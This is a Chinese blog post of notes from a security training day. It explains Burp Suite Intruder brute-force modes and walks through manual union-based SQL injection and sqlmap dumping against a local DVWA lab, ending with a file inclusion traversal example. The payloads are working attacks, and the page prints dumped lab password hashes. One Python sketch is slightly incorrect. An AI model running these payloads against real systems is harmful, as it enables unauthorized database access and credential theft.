@@ -1,0 +1,1291 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+  <link rel="manifest" href="/images/manifest.json">
+
+
+  <meta name="msapplication-config" content="/images/browserconfig.xml">
+
+
+
+  <meta name="keywords" content="网络安全,burpsuite,kali,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="上午讲burpsuite的暴力破解模块，四种攻击模式。完事安装kali。 下午SQL注入，手工和sqlmap都有介绍，最后剩一点时间简单讲了点文件包含漏洞。">
+<meta name="keywords" content="网络安全,burpsuite,kali">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【网络安全1x02】安恒厂家网络安全培训 --- day2">
+<meta property="og:url" content="http://got17.cn/1072/index.html">
+<meta property="og:site_name" content="gaoteng&#39;s blog">
+<meta property="og:description" content="上午讲burpsuite的暴力破解模块，四种攻击模式。完事安装kali。 下午SQL注入，手工和sqlmap都有介绍，最后剩一点时间简单讲了点文件包含漏洞。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2020-06-30T15:50:06.465Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【网络安全1x02】安恒厂家网络安全培训 --- day2">
+<meta name="twitter:description" content="上午讲burpsuite的暴力破解模块，四种攻击模式。完事安装kali。 下午SQL注入，手工和sqlmap都有介绍，最后剩一点时间简单讲了点文件包含漏洞。">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: 'undefined',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://got17.cn/1072/">
+
+
+
+
+
+  <title>【网络安全1x02】安恒厂家网络安全培训 --- day2 | gaoteng's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">gaoteng's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description"></h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://got17.cn/1072/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="gaoteng17">
+      <meta itemprop="description" content="About Life, Work and Code.">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="gaoteng's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">【网络安全1x02】安恒厂家网络安全培训 --- day2</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-30T23:55:08+08:00">
+                2020-06-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>上午讲burpsuite的暴力破解模块，四种攻击模式。完事安装kali。</p>
+<p>下午SQL注入，手工和sqlmap都有介绍，最后剩一点时间简单讲了点文件包含漏洞。</p>
+<a id="more"></a>
+
+<h1 id="burpsuite–Intruder"><a href="#burpsuite–Intruder" class="headerlink" title="burpsuite–Intruder"></a>burpsuite–Intruder</h1><p>抓包后右键Send to Intruder即可进行暴力破解，以下面这一段参数为例,被§§包围的部分(1)、(2)为需要破解的部分：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">user=§user§&amp;password=§password§&amp;imageField.x=17&amp;imageField.y=1</span><br><span class="line">     (1)            (2)</span><br><span class="line">---------------------------------------------------------- </span><br><span class="line"> payload1 = [user1,user2,user3]</span><br><span class="line"> payload2 = [pass1,pass2,pass3]</span><br><span class="line">----------------------------------------------------------</span><br></pre></td></tr></table></figure>
+
+<p>四种模式如下：</p>
+<h2 id="Sniper-狙击"><a href="#Sniper-狙击" class="headerlink" title="Sniper (狙击)"></a>Sniper (狙击)</h2><p>按顺序将(1)(2)其中之一中使用所给的payload进行替换，另一个参数不变。</p>
+<p>payload只能设置一个，若使用payload2的话，破解尝试顺序为：</p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>user(1)</th>
+<th>password(2)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>pass1</td>
+<td>password</td>
+</tr>
+<tr>
+<td>2</td>
+<td>pass2</td>
+<td>password</td>
+</tr>
+<tr>
+<td>3</td>
+<td>pass3</td>
+<td>password</td>
+</tr>
+<tr>
+<td>4</td>
+<td>user</td>
+<td>pass1</td>
+</tr>
+<tr>
+<td>5</td>
+<td>user</td>
+<td>pass2</td>
+</tr>
+<tr>
+<td>6</td>
+<td>user</td>
+<td>pass3</td>
+</tr>
+</tbody></table>
+<h2 id="Battering-ram-撞击"><a href="#Battering-ram-撞击" class="headerlink" title="Battering ram (撞击)"></a>Battering ram (撞击)</h2><p>使用payload同时替换所有被选中的位置。</p>
+<p>同样payload只能设置一个，使用payload2的话，破解尝试顺序为：</p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>user(1)</th>
+<th>password(2)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>pass1</td>
+<td>pass1</td>
+</tr>
+<tr>
+<td>2</td>
+<td>pass2</td>
+<td>pass2</td>
+</tr>
+<tr>
+<td>3</td>
+<td>pass3</td>
+<td>pass3</td>
+</tr>
+</tbody></table>
+<h2 id="Pitchfork-交叉"><a href="#Pitchfork-交叉" class="headerlink" title="Pitchfork (交叉)"></a>Pitchfork (交叉)</h2><p>按顺序分别使用payload1替换(1)，payload2替换(2)，一一对应，payload数量较少的列表用完则停止。</p>
+<p>payload可设置(1~替换位)个，使用payload1、payload2的话，破解尝试顺序为：</p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>user(1)</th>
+<th>password(2)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>user1</td>
+<td>pass1</td>
+</tr>
+<tr>
+<td>2</td>
+<td>user2</td>
+<td>pass2</td>
+</tr>
+<tr>
+<td>3</td>
+<td>user3</td>
+<td>pass3</td>
+</tr>
+</tbody></table>
+<p>破解方式python模拟代码如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range( min(len(payload1),len(payload2)) ):</span><br><span class="line">    user = payload1[i]</span><br><span class="line">    password = payload2[i]</span><br></pre></td></tr></table></figure>
+
+<h2 id="Cluster-Bomb-集束炸弹"><a href="#Cluster-Bomb-集束炸弹" class="headerlink" title="Cluster Bomb (集束炸弹)"></a>Cluster Bomb (集束炸弹)</h2><p>通常意义上的穷举法。</p>
+<p>payload可设置(1~替换位)个，使用payload1、payload2的话，破解尝试顺序为：</p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>user(1)</th>
+<th>password(2)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>user1</td>
+<td>pass1</td>
+</tr>
+<tr>
+<td>2</td>
+<td>user2</td>
+<td>pass1</td>
+</tr>
+<tr>
+<td>3</td>
+<td>user3</td>
+<td>pass1</td>
+</tr>
+<tr>
+<td>4</td>
+<td>user1</td>
+<td>pass2</td>
+</tr>
+<tr>
+<td>5</td>
+<td>user2</td>
+<td>pass2</td>
+</tr>
+<tr>
+<td>6</td>
+<td>user3</td>
+<td>pass2</td>
+</tr>
+<tr>
+<td>7</td>
+<td>user1</td>
+<td>pass3</td>
+</tr>
+<tr>
+<td>8</td>
+<td>user2</td>
+<td>pass3</td>
+</tr>
+<tr>
+<td>9</td>
+<td>user3</td>
+<td>pass3</td>
+</tr>
+</tbody></table>
+<p>破解方式python模拟代码如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payload2:</span><br><span class="line">        user = payload1</span><br><span class="line">        password = payload2</span><br></pre></td></tr></table></figure>
+
+<h1 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h1><p>之前装过了，虚拟机安装同理：</p>
+<p><a href="http://got17.cn/1010/">http://got17.cn/1010/</a></p>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="SQL注入漏洞—low"><a href="#SQL注入漏洞—low" class="headerlink" title="SQL注入漏洞—low"></a>SQL注入漏洞—low</h2><ol>
+<li>判断注入类型</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' or '1' = '1</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>猜列数</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1' or 'a' = 'a' order by 1 <span class="comment">#</span></span><br><span class="line">1' or 'a' = 'a' order by 2 <span class="comment">#</span></span><br><span class="line">1' or 'a' = 'a' order by ... <span class="comment">#</span></span><br><span class="line"><span class="comment">#二分查询(0~n)</span></span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>获取字段顺序</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#回显</span></span><br><span class="line"><span class="keyword">ID</span>: <span class="number">1</span><span class="string">' union select 1,2 #</span></span><br><span class="line"><span class="string">First name: admin</span></span><br><span class="line"><span class="string">Surname: admin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ID: 1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="comment">#</span></span><br><span class="line"><span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line">Surname: <span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>获取数据库名称</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>() <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#回显</span></span><br><span class="line"><span class="keyword">ID</span>: <span class="number">1</span><span class="string">' union select 1,database() #</span></span><br><span class="line"><span class="string">First name: admin</span></span><br><span class="line"><span class="string">Surname: admin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ID: 1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>() <span class="comment">#</span></span><br><span class="line"><span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line">Surname: dvwa</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>获取数据库中的表</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#回显</span></span><br><span class="line"><span class="keyword">ID</span>: <span class="number">1</span><span class="string">' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</span></span><br><span class="line"><span class="string">First name: admin</span></span><br><span class="line"><span class="string">Surname: admin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ID: 1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">#</span></span><br><span class="line"><span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line">Surname: guestbook,<span class="keyword">users</span></span><br></pre></td></tr></table></figure>
+
+<ol start="6">
+<li>查询表中字段名</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#回显</span></span><br><span class="line"><span class="keyword">ID</span>: <span class="number">1</span><span class="string">' union select 1,group_concat(column_name) from information_schema.columns where table_name='</span><span class="keyword">users</span><span class="string">' #</span></span><br><span class="line"><span class="string">First name: admin</span></span><br><span class="line"><span class="string">Surname: admin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ID: 1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="comment">#</span></span><br><span class="line"><span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line">Surname: user_id,first_name,last_name,<span class="keyword">user</span>,<span class="keyword">password</span>,avatar</span><br></pre></td></tr></table></figure>
+
+<ol start="7">
+<li>打印数据</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">1' or 1 = 1 union <span class="keyword">select</span> <span class="keyword">group_concat</span>(user_id,first_name,last_name),<span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#回显</span></span><br><span class="line"><span class="keyword">ID</span>: <span class="number">1</span><span class="string">' or 1 = 1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</span></span><br><span class="line"><span class="string">First name: admin</span></span><br><span class="line"><span class="string">Surname: admin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ID: 1'</span> <span class="keyword">or</span> <span class="number">1</span> = <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">group_concat</span>(user_id,first_name,last_name),<span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="comment">#</span></span><br><span class="line"><span class="keyword">First</span> <span class="keyword">name</span>: Gordon</span><br><span class="line">Surname: Brown</span><br><span class="line"></span><br><span class="line"><span class="keyword">ID</span>: <span class="number">1</span><span class="string">' or 1 = 1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</span></span><br><span class="line"><span class="string">First name: Hack</span></span><br><span class="line"><span class="string">Surname: Me</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ID: 1'</span> <span class="keyword">or</span> <span class="number">1</span> = <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">group_concat</span>(user_id,first_name,last_name),<span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="comment">#</span></span><br><span class="line"><span class="keyword">First</span> <span class="keyword">name</span>: Pablo</span><br><span class="line">Surname: Picasso</span><br><span class="line"></span><br><span class="line"><span class="keyword">ID</span>: <span class="number">1</span><span class="string">' or 1 = 1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</span></span><br><span class="line"><span class="string">First name: Bob</span></span><br><span class="line"><span class="string">Surname: Smith</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ID: 1'</span> <span class="keyword">or</span> <span class="number">1</span> = <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">group_concat</span>(user_id,first_name,last_name),<span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="comment">#</span></span><br><span class="line"><span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span>adminadmin,<span class="number">2</span>GordonBrown,<span class="number">3</span>HackMe,<span class="number">4</span>PabloPicasso,<span class="number">5</span>BobSmith</span><br><span class="line">Surname: <span class="number">5</span>f4dcc3b5aa765d61d8327deb882cf99,e99a18c428cb38d5f260853678922e03,<span class="number">8</span>d3533d75ae2c3966d7e0d4fcc69216b,<span class="number">0</span>d107d09f5bbe40cade3de5c71e9e9b7,<span class="number">5</span>f4dcc3b5aa765d61d8327deb882cf99</span><br></pre></td></tr></table></figure>
+
+<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sql -u [url] 需要cookie，这里可以使用burpsuite抓一个包保存到本地sqlmap</span></span><br><span class="line"></span><br><span class="line">sqlmap -r get.txt --dbs</span><br><span class="line"></span><br><span class="line">sqlmap -r get.txt -D dvwa --tables</span><br><span class="line"></span><br><span class="line">sqlmap -r get.txt -D dvwa -T users --columns</span><br><span class="line"></span><br><span class="line">sqlmap -r get.txt -D dvwa -T users -C <span class="string">"user,password"</span> --dump</span><br></pre></td></tr></table></figure>
+
+<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/dvwa/vulnerabilities/<span class="keyword">fi</span>/?page=file1.php</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改?page=后文件目录</span></span><br><span class="line">http://localhost/dvwa/vulnerabilities/<span class="keyword">fi</span>/?page=../../robots.txt</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/网络安全/" rel="tag"><i class="fa fa-tag"></i> 网络安全</a>
+          
+            <a href="/tags/burpsuite/" rel="tag"><i class="fa fa-tag"></i> burpsuite</a>
+          
+            <a href="/tags/kali/" rel="tag"><i class="fa fa-tag"></i> kali</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/1071/" rel="next" title="【投资总结------2020.6】">
+                <i class="fa fa-chevron-left"></i> 【投资总结------2020.6】
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/1073/" rel="prev" title="【网络安全1x03】安恒厂家网络安全培训 --- day3">
+                【网络安全1x03】安恒厂家网络安全培训 --- day3 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+    
+    <div id="gitalk-container">
+    </div>
+  
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="gaoteng17">
+            
+              <p class="site-author-name" itemprop="name">gaoteng17</p>
+              <p class="site-description motion-element" itemprop="description">About Life, Work and Code.</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">91</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">79</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/gaoteng17" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:gaoteng17@gmail.com" target="_blank" title="E-Mail">
+                    
+                      <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://weibo.com/u/5544866728" target="_blank" title="Weibo">
+                    
+                      <i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#burpsuite–Intruder"><span class="nav-number">1.</span> <span class="nav-text">burpsuite–Intruder</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Sniper-狙击"><span class="nav-number">1.1.</span> <span class="nav-text">Sniper (狙击)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Battering-ram-撞击"><span class="nav-number">1.2.</span> <span class="nav-text">Battering ram (撞击)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pitchfork-交叉"><span class="nav-number">1.3.</span> <span class="nav-text">Pitchfork (交叉)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cluster-Bomb-集束炸弹"><span class="nav-number">1.4.</span> <span class="nav-text">Cluster Bomb (集束炸弹)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#kali"><span class="nav-number">2.</span> <span class="nav-text">kali</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入"><span class="nav-number">3.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL注入漏洞—low"><span class="nav-number">3.1.</span> <span 